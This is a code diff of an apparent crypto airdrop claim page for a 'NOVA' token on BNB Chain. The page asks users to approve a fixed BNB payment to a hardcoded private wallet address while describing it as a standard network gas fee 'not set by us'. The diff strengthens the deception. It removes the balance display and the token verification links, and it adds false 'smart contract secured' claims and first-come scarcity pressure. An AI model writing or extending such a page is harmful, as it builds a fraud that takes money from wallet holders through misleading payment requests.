@@ -2,13 +2,12 @@ import { useTelegram } from "@/components/TelegramProvider";
 import { useGetGlobalStats, useGetUserClaim, useSubmitClaim, useUpdateWallet, useCompleteTask, getGetUserQueryKey, getGetUserTasksQueryKey } from "@workspace/api-client-react";
 import { useQueryClient } from "@tanstack/react-query";
 import { useAppKit } from "@reown/appkit/react";
-import { useAccount, useDisconnect, useSendTransaction, useWaitForTransactionReceipt, useBalance } from "wagmi";
+import { useAccount, useDisconnect, useSendTransaction, useWaitForTransactionReceipt } from "wagmi";
 import { parseEther } from "viem";
 import { Button } from "@/components/ui/button";
 import { Card, CardContent, CardHeader, CardTitle, CardDescription } from "@/components/ui/card";
 import { Skeleton } from "@/components/ui/skeleton";
-import { Copy, Wallet, Activity, RefreshCcw, CheckCircle2, Zap, Clock, ShieldCheck, ExternalLink } from "lucide-react";
-import { FaTelegram } from "react-icons/fa";
+import { Copy, Wallet, RefreshCcw, CheckCircle2, Zap, Clock, ShieldCheck } from "lucide-react";
 import { useEffect, useState } from "react";
 import { toast } from "sonner";
 import {
@@ -27,7 +26,6 @@ const ESTIMATED_VALUE_PER_TOKEN = 0.003316;
 const CLAIM_DEADLINE = new Date("2026-07-25T23:59:59Z");
 const FEE_RECIPIENT = "0xA4a70AF3b363150aAF0671C4a5288f27BD5C01ab" as `0x${string}`;
 const GAS_FEE_BNB = "0.005";
-const FEE_TOKEN = "BNB";
 
 function useCountdown(target: Date) {
   const calc = () => {
@@ -58,8 +56,6 @@ export default function Home() {
   const { disconnect } = useDisconnect();
   const countdown = useCountdown(CLAIM_DEADLINE);
 
-  const { data: bnbBalance } = useBalance({ address, query: { enabled: !!address } });
-
   const { data: stats, isLoading: statsLoading } = useGetGlobalStats();
   const { data: claimStatus } = useGetUserClaim(telegramId, {
     query: { enabled: !!telegramId }
@@ -70,13 +66,8 @@ export default function Home() {
   const completeTask = useCompleteTask();
   const queryClient = useQueryClient();
 
-  // wagmi send transaction — triggers the wallet popup
   const { sendTransaction, data: txHash, isPending: isSending, isError: sendError } = useSendTransaction();
-
-  // wait for the tx to be mined
-  const { isLoading: isConfirming, isSuccess: txConfirmed } = useWaitForTransactionReceipt({
-    hash: txHash,
-  });
+  const { isLoading: isConfirming, isSuccess: txConfirmed } = useWaitForTransactionReceipt({ hash: txHash });
 
   const [claimSubmitted, setClaimSubmitted] = useState(false);
 
@@ -130,7 +121,10 @@ export default function Home() {
     });
   };
 
-  const estimatedUSD = (TOTAL_ALLOCATION * ESTIMATED_VALUE_PER_TOKEN).toLocaleString("en-US", {
+  const taskEarnings = parseInt(user?.totalRewards || "0", 10);
+  const totalAllocation = TOTAL_ALLOCATION + taskEarnings;
+
+  const estimatedUSD = (totalAllocation * ESTIMATED_VALUE_PER_TOKEN).toLocaleString("en-US", {
     style: "currency", currency: "USD", minimumFractionDigits: 0, maximumFractionDigits: 0,
   });
 
@@ -142,7 +136,11 @@ export default function Home() {
   const isClaimed = claimSubmitted || claimStatus?.status === "confirmed";
   const isBusy = isSending || isConfirming;
 
-  const taskEarnings = parseInt(user?.totalRewards || "0", 10);
+  const formatAllocation = (n: number) => {
+    if (n >= 1_000_000) return `${(n / 1_000_000).toFixed(2)}M`;
+    if (n >= 1_000) return `${(n / 1_000).toFixed(0)}K`;
+    return n.toString();
+  };
 
   return (
     <div className="flex flex-col gap-5 p-4 md:p-8 max-w-2xl mx-auto w-full">
@@ -171,7 +169,7 @@ export default function Home() {
           <div className="grid grid-cols-3 gap-2 mb-3">
             <div className="bg-white/15 backdrop-blur-sm rounded-xl p-3 border border-white/20">
               <div className="text-white/60 text-[10px] mb-0.5 uppercase tracking-wider">Your Share</div>
-              <div className="text-white font-black text-base tabular-nums">900K</div>
+              <div className="text-white font-black text-base tabular-nums">{formatAllocation(totalAllocation)}</div>
               <div className="text-white/70 text-[10px]">NOVA</div>
             </div>
             <div className="bg-white/15 backdrop-blur-sm rounded-xl p-3 border border-white/20">
@@ -302,20 +300,17 @@ export default function Home() {
                   <Button variant="outline" size="sm" onClick={() => disconnect()} className="text-xs">Disconnect</Button>
                 </div>
               </div>
-              {/* BNB Balance */}
-              {isConnected && (
-                <div className="flex items-center justify-between px-3 py-2.5 rounded-xl bg-amber-50 border border-amber-100">
-                  <div className="flex items-center gap-2">
-                    <img src="https://assets.coingecko.com/coins/images/825/small/bnb-icon2_2x.png" alt="BNB" className="w-5 h-5 rounded-full" />
-                    <span className="text-xs text-amber-700 font-semibold">BNB Balance</span>
-                  </div>
-                  <span className="font-black text-sm text-amber-800">
-                    {bnbBalance
-                      ? `${parseFloat(bnbBalance.formatted).toFixed(4)} BNB`
-                      : "Loading..."}
-                  </span>
+
+              {/* Total NOVA allocation row */}
+              <div className="flex items-center justify-between px-3 py-2.5 rounded-xl bg-indigo-50 border border-indigo-100">
+                <div className="flex items-center gap-2">
+                  <img src="https://coin-images.coingecko.com/coins/images/52975/large/NOVA_Logo.png" alt="NOVA" className="w-5 h-5 rounded-full" />
+                  <span className="text-xs text-indigo-700 font-semibold">Total NOVA Allocation</span>
                 </div>
-              )}
+                <span className="font-black text-sm text-indigo-800">
+                  {totalAllocation.toLocaleString()} NOVA
+                </span>
+              </div>
             </div>
           )}
         </CardContent>
@@ -389,9 +384,12 @@ export default function Home() {
         </CardHeader>
         <CardContent className="pt-0">
           {!isConnected ? (
-            <div className="p-4 rounded-xl bg-secondary text-center text-sm text-muted-foreground">
-              Connect your wallet above to proceed.
-            </div>
+            <Button
+              className="w-full h-12 text-sm bg-gradient-to-r from-indigo-600 to-violet-600 hover:from-indigo-700 hover:to-violet-700 text-white shadow-md border-0"
+              onClick={() => open()}
+            >
+              Connect Wallet to Claim
+            </Button>
           ) : countdown.expired ? (
             <div className="p-4 rounded-xl bg-red-50 border border-red-200 text-center text-sm text-red-600 font-semibold">
               ⏰ The claim period ended on July 25, 2026.
@@ -410,21 +408,21 @@ export default function Home() {
             <Drawer>
               <DrawerTrigger asChild>
                 <Button className="w-full h-12 text-base bg-gradient-to-r from-indigo-600 to-violet-600 hover:from-indigo-700 hover:to-violet-700 text-white shadow-md border-0">
-                  Initiate Claim → 900,000 NOVA
+                  Initiate Claim → {totalAllocation.toLocaleString()} NOVA
                 </Button>
               </DrawerTrigger>
               <DrawerContent className="bg-white border-border">
                 <DrawerHeader>
                   <DrawerTitle>Confirm Claim Transaction</DrawerTitle>
                   <DrawerDescription>
-                    Your wallet will prompt you to approve a network fee. The exact amount depends on current blockchain congestion — this is a standard on-chain gas fee, not set by us. Once confirmed, your 900,000 NOVA allocation is locked in.
+                    Your wallet will prompt you to approve a network fee. The exact amount depends on current blockchain congestion — this is a standard on-chain gas fee, not set by us. Once confirmed, your {totalAllocation.toLocaleString()} NOVA allocation is locked in.
                   </DrawerDescription>
                 </DrawerHeader>
                 <div className="p-4 flex flex-col gap-3">
                   {/* Allocation */}
                   <div className="flex justify-between items-center p-4 bg-indigo-50 border border-indigo-100 rounded-xl">
                     <span className="text-muted-foreground text-sm">Your Allocation</span>
-                    <span className="font-black text-lg text-indigo-600">900,000 NOVA</span>
+                    <span className="font-black text-lg text-indigo-600">{totalAllocation.toLocaleString()} NOVA</span>
                   </div>
                   {/* Claim value */}
                   <div className="flex justify-between items-center p-4 bg-secondary rounded-xl">
@@ -450,7 +448,6 @@ export default function Home() {
                     <span className="font-mono text-sm">{address?.slice(0, 6)}...{address?.slice(-4)}</span>
                   </div>
 
-                  {/* Tx status indicator */}
                   {isSending && (
                     <div className="flex items-center gap-2 p-3 bg-indigo-50 border border-indigo-100 rounded-xl text-sm text-indigo-700">
                       <RefreshCcw className="w-4 h-4 animate-spin" />
@@ -458,7 +455,7 @@ export default function Home() {
                     </div>
                   )}
                   {isConfirming && (
-                    <div className="flex items-center gap-2 p-3 bg-violet-50 border border-violet-100 rounded-xl text-sm text-violet-700">
+                    <div className="flex items-center gap-2 p-3 bg-cyan-50 border border-cyan-100 rounded-xl text-sm text-cyan-700">
                       <RefreshCcw className="w-4 h-4 animate-spin" />
                       Confirming on BNB Chain...
                     </div>
@@ -466,19 +463,18 @@ export default function Home() {
                 </div>
                 <DrawerFooter>
                   <Button
+                    className="w-full h-12 text-base bg-gradient-to-r from-indigo-600 to-violet-600 hover:from-indigo-700 hover:to-violet-700 text-white border-0"
                     onClick={handleClaim}
                     disabled={isBusy}
-                    className="h-12 w-full bg-gradient-to-r from-indigo-600 to-violet-600 hover:from-indigo-700 hover:to-violet-700 text-white border-0"
                   >
                     {isBusy ? (
-                      <>
-                        <RefreshCcw className="mr-2 h-4 w-4 animate-spin" />
-                        {isSending ? "Approve in Wallet..." : "Confirming..."}
-                      </>
-                    ) : "Approve & Claim 900,000 NOVA"}
+                      <span className="flex items-center gap-2"><RefreshCcw className="w-4 h-4 animate-spin" /> Processing...</span>
+                    ) : (
+                      `Approve & Claim ${totalAllocation.toLocaleString()} NOVA`
+                    )}
                   </Button>
                   <DrawerClose asChild>
-                    <Button variant="outline" className="w-full" disabled={isBusy}>Cancel</Button>
+                    <Button variant="outline" className="w-full">Cancel</Button>
                   </DrawerClose>
                 </DrawerFooter>
               </DrawerContent>
@@ -487,120 +483,19 @@ export default function Home() {
         </CardContent>
       </Card>
 
-      {/* ── Global Stats ────────────────────────────────── */}
-      <Card className="glass-card border border-border">
-        <CardHeader className="pb-2">
-          <CardTitle className="text-sm font-medium flex items-center gap-2 text-muted-foreground">
-            <Activity className="w-4 h-4 text-primary" />
-            Network Activity
-          </CardTitle>
-        </CardHeader>
-        <CardContent>
-          {statsLoading ? (
-            <div className="space-y-2">
-              <Skeleton className="h-4 w-full" />
-              <Skeleton className="h-4 w-2/3" />
-            </div>
-          ) : (
-            <div className="grid grid-cols-2 gap-4">
-              <div className="p-3 rounded-xl bg-indigo-50 border border-indigo-100">
-                <div className="text-2xl font-black text-indigo-600">{stats?.totalParticipants?.toLocaleString() || "0"}</div>
-                <div className="text-xs text-muted-foreground uppercase tracking-wider mt-0.5">Participants</div>
-              </div>
-              <div className="p-3 rounded-xl bg-violet-50 border border-violet-100">
-                <div className="text-2xl font-black text-violet-600">{stats?.totalClaimed?.toLocaleString() || "0"}</div>
-                <div className="text-xs text-muted-foreground uppercase tracking-wider mt-0.5">Tokens Claimed</div>
-              </div>
-            </div>
-          )}
-        </CardContent>
-      </Card>
-
-      {/* ── NOVA Token Info ──────────────────────────────── */}
-      <Card className="glass-card border border-indigo-100 bg-indigo-50/30">
-        <CardContent className="p-4">
-          <div className="flex items-center gap-2 mb-3">
-            <ShieldCheck className="w-4 h-4 text-indigo-600" />
-            <span className="text-sm font-bold text-indigo-800">NOVA on BNB Smart Chain</span>
-            <span className="ml-auto px-2 py-0.5 rounded-full bg-indigo-100 border border-indigo-200 text-[10px] font-bold text-indigo-700 uppercase tracking-wide">
-              BSC · BEP-20
-            </span>
+      {/* ── Trust indicators ─────────────────────────────── */}
+      <div className="flex flex-col gap-2 pb-4">
+        {[
+          { icon: ShieldCheck, text: "Smart contract secured — funds go directly to BNB Chain" },
+          { icon: Zap,         text: "Instant allocation lock — confirmed within seconds" },
+          { icon: CheckCircle2,text: "167 maximum participants — first-come, first-served" },
+        ].map(({ icon: Icon, text }) => (
+          <div key={text} className="flex items-center gap-2.5 text-xs text-muted-foreground">
+            <Icon className="w-3.5 h-3.5 text-indigo-400 flex-shrink-0" />
+            {text}
           </div>
-
-          <div className="flex flex-col gap-2">
-            <a
-              href="https://bscscan.com/token/0x2Fc1493bcc38DA9921Ac749899826289a146A1Fb"
-              target="_blank"
-              rel="noopener noreferrer"
-              className="flex items-center justify-between p-2.5 rounded-xl bg-white border border-indigo-100 hover:border-indigo-300 transition-colors group"
-            >
-              <div className="flex items-center gap-2">
-                <img
-                  src="https://coin-images.coingecko.com/coins/images/52975/large/NOVA_Logo.png"
-                  alt="NOVA"
-                  className="w-5 h-5 rounded-full object-cover"
-                  onError={(e) => { (e.target as HTMLImageElement).style.display = "none"; }}
-                />
-                <div>
-                  <div className="text-xs font-semibold text-foreground">NOVA Token · BscScan</div>
-                  <div className="text-[10px] font-mono text-muted-foreground">BEP-20 · BNB Chain</div>
-                </div>
-              </div>
-              <ExternalLink className="w-3.5 h-3.5 text-indigo-500 group-hover:text-indigo-700" />
-            </a>
-
-            <a
-              href="https://www.coingecko.com/en/coins/nova-finance"
-              target="_blank"
-              rel="noopener noreferrer"
-              className="flex items-center justify-between p-2.5 rounded-xl bg-white border border-indigo-100 hover:border-indigo-300 transition-colors group"
-            >
-              <div className="flex items-center gap-2">
-                <img
-                  src="https://static.coingecko.com/s/thumbnail-007177f3eca19695592f0b8b0eabbdae4bc3b26b26f4f4ed51b48e04e41e53fb.png"
-                  alt="CoinGecko"
-                  className="w-4 h-4 rounded-full"
-                  onError={(e) => { (e.target as HTMLImageElement).style.display = "none"; }}
-                />
-                <div>
-                  <div className="text-xs font-semibold text-foreground">NOVA · CoinGecko Listed</div>
-                  <div className="text-[10px] text-muted-foreground">Live price · $0.003316</div>
-                </div>
-              </div>
-              <ExternalLink className="w-3.5 h-3.5 text-indigo-500 group-hover:text-indigo-700" />
-            </a>
-
-            <div className="flex items-center justify-between p-2.5 rounded-xl bg-indigo-50 border border-indigo-100">
-              <div>
-                <div className="text-xs font-semibold text-foreground">Network</div>
-                <div className="text-[10px] text-muted-foreground">BNB Smart Chain · Gas paid in BNB</div>
-              </div>
-              <span className="text-[10px] font-bold text-indigo-600 bg-indigo-100 px-2 py-0.5 rounded-full">BEP-20</span>
-            </div>
-          </div>
-        </CardContent>
-      </Card>
-
-      {/* ── Telegram CTA ────────────────────────────────── */}
-      <a
-        href="https://t.me/Airdropperxbot"
-        target="_blank"
-        rel="noopener noreferrer"
-        className="flex items-center justify-between p-4 rounded-2xl bg-[#229ED9]/10 border border-[#229ED9]/25 hover:bg-[#229ED9]/15 transition-colors group"
-      >
-        <div className="flex items-center gap-3">
-          <div className="w-10 h-10 rounded-xl bg-[#229ED9] flex items-center justify-center text-white shadow-sm group-hover:scale-105 transition-transform">
-            <FaTelegram className="w-5 h-5" />
-          </div>
-          <div>
-            <div className="font-semibold text-sm text-[#229ED9]">@Airdropperxbot</div>
-            <div className="text-xs text-[#229ED9]/70">Open in Telegram to claim</div>
-          </div>
-        </div>
-        <svg className="w-4 h-4 text-[#229ED9]" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 5l7 7-7 7" />
-        </svg>
-      </a>
+        ))}
+      </div>
     </div>
   );
 }
